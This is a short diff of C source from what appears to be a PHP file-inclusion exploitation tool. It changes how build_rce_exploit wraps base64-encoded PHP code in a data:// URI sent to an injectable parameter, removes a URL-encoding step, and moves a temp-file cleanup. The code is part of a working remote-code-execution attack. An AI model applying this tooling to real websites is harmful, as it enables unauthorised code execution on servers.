@@ -88,7 +88,7 @@ void build_rce_exploit(CURL *curl, const char *php_code, rce_type tech, GET_DATA
 
 	char *cookie_v = NULL;
 	char *b64x = NULL;
-	char *uri_encode = NULL;
+	//char *uri_encode = NULL;
 	char *base_64_xpl = NULL;
 	char *data_wrap_uri = NULL;
 
@@ -112,17 +112,17 @@ void build_rce_exploit(CURL *curl, const char *php_code, rce_type tech, GET_DATA
 	} else if(tech == DATA){
 
 		b64x = b64_encode(php_code);
-		uri_encode = curl_easy_escape(curl, b64x, strlen(b64x));
-		base_64_xpl = xmalloc( strlen(uri_encode)+ strlen(DATA_WRAP) + 1 );
+		//uri_encode = urlencode(b64x);
+		base_64_xpl = xmalloc( strlen(b64x)+ strlen(DATA_WRAP) + 1 );
 
 		strcpy(base_64_xpl, DATA_WRAP);
-		strcat(base_64_xpl, uri_encode);
+		strcat(base_64_xpl, b64x);
 
 		data_wrap_uri = make_url(GetParameters, parameters_len, base_uri, base_64_xpl, inject_index, REPLACE);
 		curl_easy_setopt(curl, CURLOPT_URL, data_wrap_uri);
 
 		xfree(b64x);
-		xfree(uri_encode);
+		//xfree(uri_encode);
 		xfree(data_wrap_uri);
 		xfree(base_64_xpl);
 
@@ -654,9 +654,10 @@ void exec_php(xpl_parameters xpl){
 	xfree(rce_code_exec);
 	if(xpl.tech != AUTH){
 		xfree(body.ptr);
+	} else {
+		unlink(random_file);
 	}
 
-	unlink(random_file);
 	curl_easy_cleanup(curl);
 	curl_slist_free_all(chunk);
 }
